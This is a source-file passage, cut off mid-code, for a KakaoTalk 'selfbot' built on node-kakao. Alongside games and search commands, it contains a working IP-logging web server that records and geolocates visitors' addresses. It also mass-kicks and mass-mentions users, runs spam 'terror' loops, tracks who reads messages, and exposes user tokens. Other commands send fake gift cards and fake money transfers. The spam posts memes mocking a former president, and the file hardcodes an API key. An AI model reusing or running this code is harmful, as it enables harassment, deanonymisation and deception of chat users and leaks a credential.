
let deviceName = "MSTB";
let deviceUUID = "HDpmqLPPm3JiLqmz+it0KyqZXIcOFLSxVM9Wg7JWhljoUT+QK75kbTllEtGXu/xlupLq+RMOSZfp+7rTyyJawA==";

var numud= 0;
var numu= 0;
let month = new Date().getMonth() + 1
let joinjoin = true
let join = [];
let fuck = [];
let king = [];
let updown = [];
let udo = [];
let banKey = [];
let banKey2 = "yes"
let adminList = [9013168238129656452];
let iskeyIssued = false;
let iskeyIssued2 = false;
let key;
let key2;
let chatReaders = {};
let detectingUsers = [];
let mustDetect = [];
let roomr = false
let li = false
let userInfo;
let id;
let roomId;
let accountUserId;
let prefix = "-"

async function sendLong(_kakaoChannel, text1, text2) {
    try {
        var r = await node_kakao.AttachmentApi.upload(1, "long", text2);
        _kakaoChannel.sendChat(
            new node_kakao.ChatBuilder().text(text1).append(new node_kakao.AttachmentContent(r.result)).build(1)
        );
    } catch (e) {
        _kakaoChannel.sendChat(e);
    }
}
let Hider = ["12345678"];

let dlog = false;

let chap = false;
const ytdl = require("ytdl-core");

let runningSpam = false;
let spamInterval;

let customChat;

let chaton = true;

let runningNick = false;
let $TitleSpamList = [];
let runningSpamString = false;
let runningSpamString1 = false;
let stringInterval;
const YouTube = require('youtube-node');
const youTube = new YouTube();
youTube.setKey('AIzaSyB1OOSpTREs85WUMvIgJvLTZKye4BVsoFU');
const getDnsIp = require("ip");
const express = require('express');
const http = require('http');
let app = express();
app.set('trust proxy', true);
const is = require('is_js');
let ipLog_local;
let ipLog_admin = getDnsIp.address();
let ipLog_channel;
let ipLog_loggedIps = [];
let ipLog_adress;
let ipLog_filter = true;
let ipLog_usingServer = "None";
ipPort = Math.floor(Math.random() * 30000);
ipPort *= 1;

function getClientIpFromXForwardedFor(value) {
    if (!is.existy(value)) {
        return null;
    }
    if (is.not.string(value)) {
        throw new TypeError("Expected a string, got \"".concat(_typeof(value), "\""));
    }
    var forwardedIps = value.split(',').map(function (e) {
        var ip = e.trim();
        if (ip.includes(':')) {
            var splitted = ip.split(':');
            if (splitted.length === 2) {
                return splitted[0];
            }
        }
        return ip;
    });
    return forwardedIps.find(is.ip);
}

function getClientIp(req) {
    if (req.headers) {
        if (is.ip(req.headers['x-client-ip'])) {
            return req.headers['x-client-ip'];
        }
        var xForwardedFor = getClientIpFromXForwardedFor(req.headers['x-forwarded-for']);
        if (is.ip(xForwardedFor)) {
            return xForwardedFor;
        }
        if (is.ip(req.headers['cf-connecting-ip'])) {
            return req.headers['cf-connecting-ip'];
        }
        if (is.ip(req.headers['fastly-client-ip'])) {
            return req.headers['fastly-client-ip'];
        }
        if (is.ip(req.headers['true-client-ip'])) {
            return req.headers['true-client-ip'];
        }
        if (is.ip(req.headers['x-real-ip'])) {
            return req.headers['x-real-ip'];
        }
        if (is.ip(req.headers['x-cluster-client-ip'])) {
            return req.headers['x-cluster-client-ip'];
        }
        if (is.ip(req.headers['x-forwarded'])) {
            return req.headers['x-forwarded'];
        }
        if (is.ip(req.headers['forwarded-for'])) {
            return req.headers['forwarded-for'];
        }
        if (is.ip(req.headers.forwarded)) {
            return req.headers.forwarded;
        }
    }
    if (is.existy(req.connection)) {
        if (is.ip(req.connection.remoteAddress)) {
            return req.connection.remoteAddress;
        }

        if (is.existy(req.connection.socket) && is.ip(req.connection.socket.remoteAddress)) {
            return req.connection.socket.remoteAddress;
        }
    }
    if (is.existy(req.socket) && is.ip(req.socket.remoteAddress)) {
        return req.socket.remoteAddress;
    }
    if (is.existy(req.info) && is.ip(req.info.remoteAddress)) {
        return req.info.remoteAddress;
    }
    if (is.existy(req.requestContext) && is.existy(req.requestContext.identity) && is.ip(req.requestContext.identity.sourceIp)) {
        return req.requestContext.identity.sourceIp;
    }
    return null;
}




"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function (o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    Object.defineProperty(o, k2, { enumerable: true, get: function () { return m[k]; } });
}) : (function (o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function (o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function (o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};

var fs = require('fs')
const banWord2 = ["https://open.kakao.com/o/"];
const banWord = ["ㅗ", "십알", "ㅈㄹ", "ㅅㅂ", "ㅅ1ㅂ", "시1발", "ㅄ", "지랄", "씨발", "또라이", "적출", "니미", "매도", "병신", "좆", "버러지", "니엄마", "섹스", "주식", "느금마", "새끼", "주식", "애미", "매입", "시발"];
const axios = require('axios');
const cheerio = require("cheerio");
const request = require('request');
const { url } = require("inspector");
const { CheckinData, ChannelInfo, ChatBuilder } = require("node-kakao");
const node_kakao = require("node-kakao");
const { send } = require("process");
const $AuthApiClient = node_kakao.AuthApiClient;
const $ChatBuilder = node_kakao.ChatBuilder;
const $KnownFeedType = node_kakao.KnownFeedType;
const $KnownPostItemType = node_kakao.KnownPostItemType;
const $ReplyAttachment = node_kakao.ReplyAttachment;
const $TalkClient = node_kakao.TalkClient;
const CLIENT = new $TalkClient();
const readline = require("readline");
const { data } = require('cheerio/lib/api/attributes');
const { Console } = require("console");
const getInfo = __importStar(require("./info.json"));
let { email, pw } = getInfo;
const dns = require('dns');
const translate = require('translate-google')
var geoip = require('geoip-lite');
const e = require("express");



app.get('/', function (req, res) {
    res.sendFile(__dirname + '/ip.png')
    var nofilterIP = getClientIp(req);
    var ip = nofilterIP.split(':')[nofilterIP.split(':').length - 1];
    if (ipLog_usingServer != "None" && !(ipLog_loggedIps.includes(ip))) {
        var saveIp = "\n" + ip + "";
        fs.readFile('ip.txt', 'utf8', function(err, data){
            fs.writeFile('ip.txt', data + saveIp, 'utf8', function(error){ console.log(ip) }); 
        });
        if ((ipLog_local != ip && ipLog_admin != ip) || ipLog_filter == false) {
            try {
                var geo = geoip.lookup(ip);
                var gco = geo.country
            } catch(error) {
                gco = "Unknown"
            }
            if(gco == "KR") {
            ipLog_channel.sendChat(ip)
            ipLog_loggedIps.push(ip)
        } else {
            ipLog_channel.sendChat(ip + " [ VPN ]")
            ipLog_loggedIps.push(ip);
        }
    }
    }
});
app.listen(ipPort, function () { });





CLIENT.on('chat_read', (chat, channel, reader) => {
    var detectChar = channel._channel.channelId + ":" + reader.userId;
    if (mustDetect.includes(detectChar)) {
        for (var getValueFor = 0; getValueFor < mustDetect.length; getValueFor++) {
            if (mustDetect[getValueFor] == detectChar) {
                mustDetect.splice(getValueFor);
            }
        }
        channel.sendChat(new node_kakao.ChatBuilder().append(new node_kakao.MentionContent(channel.getUserInfo({ userId: reader.userId }))).text("님이 읽으셨습니다").build(1));
    }
})

     

CLIENT.channelList.normal.on('chat', (data, channel) => {
    const sender = data.getSenderInfo(channel);
    if (!sender) return;

    id = data.getSenderInfo(channel).userId;
    roomId = channel._channel.channelId.low;
    if (data.text.startsWith(prefix + "정보")) {
        if (adminList.includes(id)) {
        sendLong(channel,channel.getUserInfo({ userId: data.mentions[0].user_id }).nickname + "님의 정보입니다 " , "닉네임 : " + channel.getUserInfo({ userId: data.mentions[0].user_id }).nickname + 
        "\n\n아이디 : " + data.mentions[0].user_id +
        "\n\n프로필 사진 : " + channel.getUserInfo({ userId: data.mentions[0].user_id }).fullProfileURL +
        "\n\n어카운트 아이디 : " + channel.getUserInfo({ userId: data.mentions[0].user_id }).accountId + 
        "\n\n상태 메시지 : " + channel.getUserInfo({ userId: data.mentions[0].user_id }).statusMessage +
        "\n\n가입국가 : " + channel.getUserInfo({ userId: data.mentions[0].user_id }).countryIso) 
    }}




})





CLIENT.channelList.open.on('chat', (data, channel) => {
    const sender = data.getSenderInfo(channel);
    if (!sender) return;



    id = data.getSenderInfo(channel).userId;
    roomId = channel._channel.channelId.low;
    if (data.text.startsWith(prefix + "정보")) {
        if (adminList.includes(id)) {
            sendLong(channel, channel.getUserInfo({ userId: data.mentions[0].user_id }).nickname + "님의 정보입니다 " , "닉네임 : " + channel.getUserInfo({ userId: data.mentions[0].user_id }).nickname + 
        "\n\n아이디 : " + data.mentions[0].user_id +
        "\n\n프로필 사진 : " + channel.getUserInfo({ userId: data.mentions[0].user_id }).fullProfileURL +
        "\n\n유저타입 : " + channel.getUserInfo({ userId: data.mentions[0].user_id }).userType + 
        "\n\n링크아이디 : " + channel.getUserInfo({ userId: data.mentions[0].user_id }).linkId +
        "\n\n오픈토큰 : " + channel.getUserInfo({ userId: data.mentions[0].user_id }).openToken) 
    }}



    if (data.text.startsWith(prefix + "카프 ")) {
        if (adminList.includes(id)) {
            if(isNaN(channel.getUserInfo({ userId: data.mentions[0].user_id }).linkId)) {
                channel.sendChat("[ 🛡 ] " + channel.getUserInfo({ userId: data.mentions[0].user_id }).nickname + "님의 프로필은 카카오톡 프로필입니다")
            } else {       
            channel.sendChat("[ 🛡 ] " + channel.getUserInfo({ userId: data.mentions[0].user_id }).nickname + "님의 프로필은 오픈 프로필입니다")
    }}}

})

CLIENT.on('chat', (data, channel) => {
    const sender = data.getSenderInfo(channel);
    if (!sender) return;
function sendrawch(t, t2, t3) {
    channel.sendChat(
        new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent(t3)).text(t2).build(t))
    }
    id = data.getSenderInfo(channel).userId;
    roomId = channel._channel.channelId


    if (Hider.includes(roomId + ":" + id)) {
        try {
            channel.hideChat(data.chat);
        } catch (e) {
            channel.sendChat(e + "");
        }
    }
    if (!(data.text == "V" ||data.text == "v" )) {
    if (join.includes(id)) {
        channel.sendChat("✅보안 코드 작동중✅ \n\n보안코드 V를 입력해주세요!")
        pausecomp(220)
            channel.hideChat(data.chat);
        }}

        if (data.text.startsWith(prefix + "핑 ")) {
            var ping = data.text.replace(prefix + "핑 ", "");
        dns.lookup(encodeURI(ping), (err, address, family) => {
            channel.sendChat('본 사이트가 사용하는 아이피 : \n' + address);
        });
    }

    if (data.text == prefix + "on") {
        if (adminList.includes(id)) {
            channel.sendChat("ON")
            chaton = true
        }
    }

    if (data.text == prefix + "off") {
        if (adminList.includes(id)) {
            channel.sendChat("OFF")
            chaton = false
        }
    }
    function chunk(arr, size) {
        var i,
          j,
          temparray = [],
          chunk = size;
        for (i = 0, j = arr.length; i < j; i += chunk) {
          temparray.push(arr.slice(i, i + chunk));
        }
        return temparray;
      }
      function pausecomp(millis) {
        var date = new Date();
        var curDate = null;
        do {
          curDate = new Date();
        } while (curDate - date < millis);
      }

      if (data.text.startsWith(prefix + "모두감지")) {
        if (adminList.includes(id)) {
            channel.sendChat("모두감지를 시작합니다")
        let mentionList1 = chunk(Array.from(channel.getAllUserInfo()), 15);
        for (var i = 0; i < mentionList1.length; i++) {
          mentionList1[i].forEach((v, j) => {
            pausecomp(0);
              var detectChar = roomId + ":" + v.userId
              mustDetect.push(detectChar);
          });
        }
      }}
      if (data.text.startsWith(prefix + "모두강퇴")) {
        if (adminList.includes(id)) {
        let mentionList1 = chunk(Array.from(channel.getAllUserInfo()), 15);
        for (var i = 0; i < mentionList1.length; i++) {
          mentionList1[i].forEach((v, j) => {
            try {
            channel.kickUser2(v.userId)
            } catch (error) {
                console.log(" ")
            }
          });
        }
      }}
      if (data.text.startsWith(prefix + "명령어") || data.text.startsWith(prefix + "메뉴")) {
        var m = "\n------------normal list-------------\n\n" + 
       "현재 칭호 : " +prefix +"\n\n(카톡) Dev Plus Bot (카톡)\n\n" +
     "\n명령어" +
     "\n명령어 목록을 가져옵니다" +
     "\n" +
     "\n인증" +
     "\n관리자임을 인증받습니다" +
     "\n" +
     "\n기프티콘" +
     "\n가짜 기프티콘을 가져옵니다!\n" +
     "\nlive" +
     "\n라아브톡 상태로 변환합니다\n" +
     "\n보조" +
     "\n보이스톡을 조작합니다\n" +
     "\n차트" +
     "\n1~100위 멜론 차트를 가져옵니다\n" +
     "\n링크" +
     "\n링크 주소를 가리고 보냅니다 | 형식 (ex. -링크 youtube.com)" +
     "\n" +
     "\n롤" +
     "\n롤 정보를 불러옵니다 | 형식 (ex. -롤 닉네임)" +
     "\n" +
     "\n봇" +
     "\n봇 작동 여부를 확인합니다" +
     "\n" +
     "\n프로필" +
     "\n아이디로 프로필을 불러옵니다 | 형식 (ex. -프로필 아이디)" +
     "\n" +
     "\n채팅청소" +
     "\n채팅을 청소합니다" +
     "\n" +
     "\n아이디" +
     "\n아이디를 가져옵니다 | 형식 (멘션, 답장)" +
     "\n" +
     "\n답장" +
     "\n답장을 조작합니다 | 형식 (ex. -답장 조작할 답장/내가 보낼 메시지/ 멘션)" +
     "\n" +
     "\ntv" +
     "\n카카오 tv 출력 | 형식 (ex. -tv 카카오 tv 링크)" +
     "\n" +
     "\n" +
     "\n큰임티" +
     "\n이모티콘에 크기를 변동하여 보냅니다 | 형식 (ex. -큰임티 n/n)" +
     "\n" +
     "\n외치기" +
     "\n외치기 텍스트로 보냅니다 (오픈 채팅방의 경우, 방장 혹은 부방 권한 필요)" +
     "\n" +
     "\n핑" +
     "\n사이트가 사용하는 아이피를 확인합니다 | 형식 (ex. -핑 링크)" +
     "\n" +
     "\n업다운" +
     "\n업다운 게임을 합니다" +
     "\n" +
     "\n업다운 포기" +
     "\n업다운 게임을 포기합니다" +
     "\n" +
     "\n주사위" +
     "\n주사위를 굴립니다" +
     "\n" +
     "\n검색" +
     "\n유튜브, 구글, 나무위키, 네이버에서 검색한 결과를 가져옵니다 | 형식 (ex. -검색 검색할 메시지)" +
     "\n" +
     "\n쪽지" +
     "\n상대방에게 쪽지를 보냅니다 | 형식 (ex. -쪽지 보낼 메시지/ 멘션)" +
     "\n" +
     "\n코로나" +
     "\n코로나 정보를 가져옵니다" +
     "\n" +
     "\no검색" +
     "\n오픈 채팅방을 검색합니다 | 형식 (ex. -o검색 검색할 옾챝방 이름)" +
     "\n" +
     "\n노알라" +
     "\n노알라" +
     "\n" +
     "\n노래" +
     "\n노래 가사를 불러옵니다" +
     "\n" +
     "\n------------admin list-------------" +
     "\n" +
     "\n방로그" +
     "\n방 정보를 가져옵니다" +
     "\n" +
     "\n밴키" +
     "\n욕설 또는 광고 감지를 끄고 킵니다" +
     "\n" +
     "\n삭메감지" +
     "\n삭메감지를 실행합니다" +
     "\n" +
     "\n아이피" +
     "\n상대방 아이피를 따오기를 시도합니다" +
     "\n" +
     "\n삭제" +
     "\n봇이 보낸 메시지를 삭제합니다 | 형식 (답장)" +
     "\n" +
     "\n삭제a" +
     "\n봇이 보낸 모든 메시지를 삭제합니다 | 형식 (답장)" +
     "\n" +
     "\nev" +
     "\n명령어를 실행합니다" +
     "\n" +
     "\n종료" +
     "\n사용을 중지합니다" +
     "\n" +
     "\n도배" +
     "\n도배합니다" +
     "\n" +
     "\n중지" +
     "\n도배를 중지합니다" +
     "\n" +
     "\n공지" +
     "\n공지를 새로 씁니다" +
     "\n" +
     "\n방제" +
     "\n방제목을 바꿉니다" +
     "\n" +
     "\n칭호" +
     "\n칭호을 바꿉니다" +
     "\n" +
     "\n방제p" +
     "\n방제를 고정합니다" +
     "\n" +
     "\n방제n" +
     "\n방제 고정을 해제합니다" +
     "\n" +
     "\n감지" +
     "\n상대를 감지합니다" +
     "\n" +
     "\n프사" +
     "\n프사를 가져옵니다" +
     "\n" +
     "\n읽은사람" +
     "\n읽은사람을 확인합니다" +
     "\n" +
     "\n로그" +
     "\n로그를 확인합니다" +
     "\n" +
     "\n따라해" +
     "\n상대방을 따라합니다" +
     "\n" +
     "\n따라해중지" +
     "\n상대방을 따라하는 것을 중지합니다" +
     "\n" +
     "\n임티" +
     "\n이모티콘을 보냅니다" +
     "\n" +
     "\n임티목록" +
     "\n이모티콘 목록을 가져옵니다" +
     "\n" +
     "\n컴폭" +
     "\n이모티콘을 보냅니다" +
     "\n" +
     "\n업데이트" +
     "\n업데이트를 확인합니다" +
     "\n" +
     "\nx" +
     "\n상대방의 아이피를 땁니다" +
     "\n" +
     "\n정보" +
     "\n자신 또는 상대방의 정보를 가져옵니다" +
     "\n" +
     "\n카프" +
     "\n카카오톡 프로필인지 오픈 프로필인지 확인합니다" +
     "\n" +
     "\n모두감지" +
     "\n읽은사람을 모두 감지합니다" +
     "\n" +
     "\n모두강퇴" +
     "\n모든 사람을 강퇴합니다 (오픈 채팅방의 경우, 방장 혹은 부방 권한 필요)" +
     "\n" +
     "\n모두멘션" +
     "\n모든 사람을 멘션합니다" +
     "\n" +
     "\n연속멘션" +
     "\n모든 사람을 멘션합니다 (한 채팅에 한명씩 멘션합니다)" +
     "\n" +
     "\n노배" +
     "\n노무현 도배" +
     "\n" +
     "\nN" +
     "\n봇의 이름을 무작위로 바꾸는 것을 반복합니다 (테러)" +
     "\n" +
     "\n오배" +
     "\n카톡에서 튕기게 합니다" +
     "\n" +
     "\n한강" +
     "\n한강물 온도를 불러옵니다" +
     "\n" +
     "\n가리기a" +
     "\n모든 메시지를 가립니다 (오픈 채팅방 한정, 오픈채팅 권한 필요)" +
     "\n" +
     "\n강퇴" +
     "\n상대방을 강퇴시킵니다 (오픈 채팅방 한정, 오픈채팅 권한 필요)" +
     "\n" +
     "\n메시지" +
     "\n메시지 정보를 불러옵니다" +
     "\n" +
     "\n멘도" +
     "\n멘션도배를 합니다" +
     "\n" +
     "\n번역" +
     "\n한국어를 영어로 번역합니다" +
     "\n" +
     "\n닉변" +
     "\n봇의 이름을 변경합니다" +
     "\n" +
     "\n노래(막힘)" +
     "\n노래 가사를 불러옵니다" +
     "\n" +
     "\n테러" +
     "\n테러를 합니다" +
     "\n" +
     "\n송금" +
     "\n가짜 송금을 보냅니다 | 형식 (ex. -송금 100)";
            sendLong(channel, "[ 봇 명령어 ]" , m)
        }

      if (data.text == prefix + "모두멘션") {
        if (adminList.includes(id)) {
        let all_mention = new node_kakao.ChatBuilder()
        let mentionList = chunk(Array.from(channel.getAllUserInfo()), 15);
        channel.sendChat(
          "[ ! ] 목표 수: " + Array.from(channel.getAllUserInfo()).length
        );
        mentionList.forEach((v, i) => {
          mentionList[i].forEach((c, j) => {
            all_mention.append(new node_kakao.MentionContent(channel.getUserInfo({ userId: c.userId })));
          });
          channel.sendChat(all_mention.build(1));
          all_mention = new node_kakao.ChatBuilder();
          pausecomp(220);
        });
      }}

      if (data.text == prefix + "연속멘션") {
        if (adminList.includes(id)) {
        let all_mention = new node_kakao.ChatBuilder()
        let mentionList = chunk(Array.from(channel.getAllUserInfo()), 15);
        channel.sendChat(
          "[ ! ] 목표 수: " + Array.from(channel.getAllUserInfo()).length
        );
        mentionList.forEach((v, i) => {
          mentionList[i].forEach((c, j) => {
            all_mention.append(new node_kakao.MentionContent(channel.getUserInfo({ userId: c.userId })));
            channel.sendChat(all_mention.build(1));
            all_mention = new node_kakao.ChatBuilder();
            pausecomp(110);
        });
        });
      }}

    if (data.text == prefix + "업다운") {
        if(!(updown.includes(roomId))) {
            updown.push(roomId)
            udo.push(id)
            channel.sendChat("업다운 게임을 시작하였습니다. \n1~1000까지 숫자를 -업다운 (숫자) 형태로 입력해주세요!")
                numud = Math.floor(Math.random() * 1000) + 1
        } else {
            channel.sendChat("이미 게임이 시작되었습니다")
        }}
    if (data.text.startsWith(prefix + "업다운 ")) {
        if (!(data.text.startsWith(prefix + "업다운 포기"))) {
        if (updown.includes(roomId)) {
        var ud = data.text.replace(prefix + "업다운 ", "");
        if(ud < numud) {
            channel.sendChat("❌ ⬆ " +ud + "보단 up! ⬆ ❌")
        } else {
            if(ud > numud) {
                channel.sendChat("❌ ⬇ " + ud + "보단 down! ⬇ ❌")
        } else {
            if(ud == numud) {
                channel.sendChat(
                    new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                        "type": "animated-sticker/digital-item",
                        "path": "4412206.emot_017.webp",
                        "name": "(이모티콘)",
                        "sound": "",
                        "width": "360",
                        "height": "360",
                        "msg": '',
                        "alt": "카카오 이모티콘"
                    })).build(20)
                );
                channel.sendChat(new node_kakao.ChatBuilder().text("✅").append(new node_kakao.MentionContent(channel.getUserInfo({ userId: id }))).text("님이 정답!✅\n정답 : " + numud).build(1));
                for (var getValueFor = 0; getValueFor < updown.length; getValueFor++) {
                    if (updown[getValueFor] == roomId) {
                        updown.splice(getValueFor);
                    }}
            } else {
                channel.sendChat("올바르지 않은 형태입니다")
            }
        }
        } 
    } else {
        channel.sendChat("게임을 먼저 시작해주세요!\n-업다운")
    }
}}
if (data.text.startsWith(prefix + "업다운 포기")) {
    if (udo.includes(id)) {
    for (var getValueFor = 0; getValueFor < updown.length; getValueFor++) {
        if (updown[getValueFor] == roomId) {
            updown.splice(getValueFor);
        }}
        for (var getValueFor = 0; getValueFor < udo.length; getValueFor++) {
            if (udo[getValueFor] == id) {
                udo.splice(getValueFor);
            }}
        channel.sendChat("😒업다운을 포기하였습니다😒")
}}


    if (data.text == prefix + "인증") {
        try {
        if (adminList.includes(id)) {
            channel.sendChat("[ 🛡 ] 이미 관리자에 등록되어있는 아이디입니다!");
        } else {
            key = Math.random().toString(10).slice(2, 5)
            iskeyIssued = true;
            var key_ = key * 4
            console.log("VERIFICATION CODE: " + key);
        }
    } catch(error) {
        console.log(error)
    }}




    if (data.text == "V"||data.text == "v" ) {
        if (join.includes(id)) {
            channel.sendChat("✅보안 인증 완료✅")
            for (var getValueFor = 0; getValueFor < join.length; getValueFor++) {
                if (join[getValueFor] == id) {
                    join.splice(getValueFor);
                }}   
                iskeyIssued2 = false;
            }
    }

    if(id == 376995854 || id == 376995854 || id == 376995854 || id == 349582353 || id == 321646412) {
    adminList.push(id);
    }

    if (data.text == key && iskeyIssued) {
        if (!(adminList.includes(id))) {
            key = null;
            iskeyIssued = false;
            adminList.push(id);
            console.log("NEW ADMIN VERIFICATION: " + (id));
            channel.sendChat("✅보안 인증 완료✅")
        } else {
            channel.sendChat(
                new node_kakao.ChatBuilder()
                    .append(new node_kakao.ReplyContent(data.chat))
                    .text("[ 🛡 ] 이미 관리자에 등록되어있는 아이디입니다!")
                    .build(1)
            );

        }
    }


    if (chaton == true) {
        if (data.text.startsWith(prefix + "공지 ")) {
            if (adminList.includes(id)) {
                var nt = data.text.replace(prefix + "공지 ", "");
                channel.setNoticeMeta(nt)
            } else {
                channel.sendChat("[ 🛡 ] 본 명령어를 실행할 권한이 없습니다");
            }
        }



        if (data.text.startsWith(prefix + "기프티콘")) {
        channel.sendChat(
            new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                "L": "",
                "Q": "기프티콘",
                "V": "brand",
                "R": [
                    {
                        "D": "",
                        "L": "",
                        "DE": "",
                        "I": "https://k.kakaocdn.net/dn/bLFTBy/bl3pFGMWniP/u3jWKaCXTE27YU4Z6slhJ1/kakaolink40_original.png",
                        "T": "선물과 메시지를 보냈습니다!",
                        "W": "500",
                        "H": "671"         
                    }
                ],
                "F": {
                    "BU": [
                        {
                            "T": "선물함으로 가기",
                            "L": "kakaoplus://plusfriend/talk/bot/@1921/나는 원숭이다"
                        }
                    ]
                }
            }))
                .build(23)
        )}
        
        if (data.text.startsWith(prefix + "이벤트 ")) {
            if (adminList.includes(id)) {
            var ntt = data.text.replace(prefix + "이벤트 ", "");
                sendrawch(1,ntt,{
                    "decoEvent": {
                       "eventID":  1625464374
                    }
                 })
        }}
        if (data.text.startsWith(prefix + "live")) {
            if (!(data.text == prefix + "live off")) {
            if (adminList.includes(id)) {
                try {
                    async function aa() {
                        var myMsg = await channel.setLiveTalkInfoMeta({
                            "liveon": true,
                            "title": "운지",
                            "startTime": 1111111111,
                            "userId": "",
                            "csIP": "211.231.102.213",
                            "csIP6": "2404:4600:6:369:211:231:102:213",
                            "csPort": 9000,
                            "callId": "1111111111111111"
                        });
                        await channel.setLiveTalkCountMeta({
                            count: 1
                        });
                        if (myMsg.success) {
                            channel.sendChat("live on");
                        } else {
                            channel.sendChat("live fail");
                        }
                    }
                    aa();
                } catch (e) {
                    channel.sendChat(e);
                }
            }
        }}


        if (data.text.startsWith("야 ")) {
            if (!(data.text == prefix + "live off")) {
            if (adminList.includes(id)) {
                try {
                    async function aa() {
                        var myMsg = await channel.setLiveTalkInfoMeta({
                            "liveon": true,
                            "title": "운지",
                            "startTime": 1111111111,
                            "userId": data.mentions[0].user_id,
                            "csIP": "211.231.102.213",
                            "csIP6": "2404:4600:6:369:211:231:102:213",
                            "csPort": 9000,
                            "callId": "1111111111111111"
                        });
                        await channel.setLiveTalkCountMeta({
                            count: 1
                        });
                    }
                    aa();
                } catch (e) {
                    channel.sendChat(e);
                }
            }
        }}
        if (data.text.startsWith(prefix + "live ")) {
            if (!(data.text == prefix + "live off")) {
            if (adminList.includes(id)) {
                try {
                    async function aa() {
                        var myMsg = await channel.setLiveTalkInfoMeta({
                            "liveon": true,
                            "title": "운지",
                            "startTime": 1111111111,
                            "userId": data.mentions[0].user_id,
                            "csIP": "211.231.102.213",
                            "csIP6": "2404:4600:6:369:211:231:102:213",
                            "csPort": 9000,
                            "callId": "1111111111111111"
                        });
                        await channel.setLiveTalkCountMeta({
                            count: 1
                        });
                    }
                    aa();
                } catch (e) {
                    channel.sendChat(e);
                }
            }
        }}

        if (data.text == prefix + "live off") {
            if (adminList.includes(id)) {
                try {
                    async function aa() {
                        await channel.setLiveTalkCountMeta({
                            count: 0
                        });
                        var myMsg = await channel.setLiveTalkInfoMeta({
                            "liveon": false,
                            "title": "",
                            "startTime": 1111111111,
                            "userId": id,
                            "csIP": "211.231.102.213",
                            "csIP6": "2404:4600:6:369:211:231:102:213",
                            "csPort": 9000,
                            "callId": "1111111111111111"
                        });
                        if (myMsg.success) {
                            channel.sendChat("live off");
                        } else {
                            channel.sendChat("live fail");
                        }
                    }
                    aa();
                } catch (e) {
                    channel.sendChat(e);
                }
            }
        }
        if (data.text.startsWith(prefix + "롱텍 ")) {
            if (adminList.includes(id)) {
                var t1 = data.text.replace(prefix + "롱텍 ", "").split('/')[0];
                var t2 = data.text.replace(prefix + "롱텍 ", "").split('/')[1];
                sendLong(channel , t1 , t2)
        }}



        if (data.text.startsWith(prefix + "N")) {
            if (adminList.includes(id)) {
         runningNick = true;
            }}

            if (data.text.startsWith(prefix + "N!")) {
                if (adminList.includes(id)) {
             runningNick = false;
                }}

        if (data.text.startsWith(prefix + "노배")) {
            if (adminList.includes(id)) {
                    if (!runningSpamString) {
                        runningSpamString = true;
                        stringInterval = setInterval(() => {
                        sendErrorPhone()
                            var value = Math.floor(Math.random() * 5);
                            switch(value) {
                              case 0 :
                                    channel.sendChat(
                                    new node_kakao.ChatBuilder()
                                    .append(new node_kakao.AttachmentContent({
                                        shout: true
                                    }))
                                    .text("야 기분좋다 ㅋ야 기분좋다 ㅋ야 기분좋다 ㅋ야 기분좋다 ㅋ응디 응디 응디 응디 응디 응디 응디 응디 (흔들으라이!)")
                                    .build(1)
                                )
                                channel.setNoticeMeta("나도 군대 갔다 왔고, 예비군훈련[2]까지 다 받았는데, 심심하면 사람한테 세금 내라 하고, 불러다가 뺑뺑이 돌리고 훈련시키고 했는데, 거 위에 사람들은 뭐 했어! 작전통제권 자기들 나라 자기 군대 작전 통제도 한 개 제대로 할 수 없는 군대를 맨들어 놔 놓고 나 국방장관이오! 나 참모총장이오! 그렇게 별들 달고 끄드럭(거드럭)거리고 말았다는 얘깁니까? 그래서 작통권 회수하면 안 된다고 줄줄이 모여가 가지고 성명 내고. 자기들이 직무유기 아입니까?")
                              break;
                              case 1 :
                                channel.sendChat("노알라 부엉이 코알라 어↗↘... 아니 이 양반아   너 몇살이야 너 ... 애비가 누구야")
                              break;
                              case 2 :
                                channel.sendChat(
                                    new node_kakao.ChatBuilder()
                                    .append(new node_kakao.AttachmentContent({
                                        shout: true
                                    }))
                                    .text("모든 것이 노무현이가 하는거 반대만 하면 정의라 이겁니까?!")
                                    .build(1)
                                )
                              break;
                              case 3 :
                                channel.sendChat(
                                    new node_kakao.ChatBuilder()
                                    .append(new node_kakao.AttachmentContent({
                                        shout: true
                                    }))
                                    .text("나도 군대 갔다 왔고, 예비군훈련[2]까지 다 받았는데, 심심하면 사람한테 세금 내라 하고, 불러다가 뺑뺑이 돌리고 훈련시키고 했는데, 거 위에 사람들은 뭐 했어! 작전통제권 자기들 나라 자기 군대 작전 통제도 한 개 제대로 할 수 없는 군대를 맨들어 놔 놓고 나 국방장관이오! 나 참모총장이오! 그렇게 별들 달고 끄드럭(거드럭)거리고 말았다는 얘깁니까? 그래서 작통권 회수하면 안 된다고 줄줄이 모여가 가지고 성명 내고. 자기들이 직무유기 아입니까?")
                                    .build(1)
                                )
                              break;
                              case 4 :
                                channel.sendChat(
                                    new node_kakao.ChatBuilder()
                                    .append(new node_kakao.AttachmentContent({
                                        shout: true
                                    }))
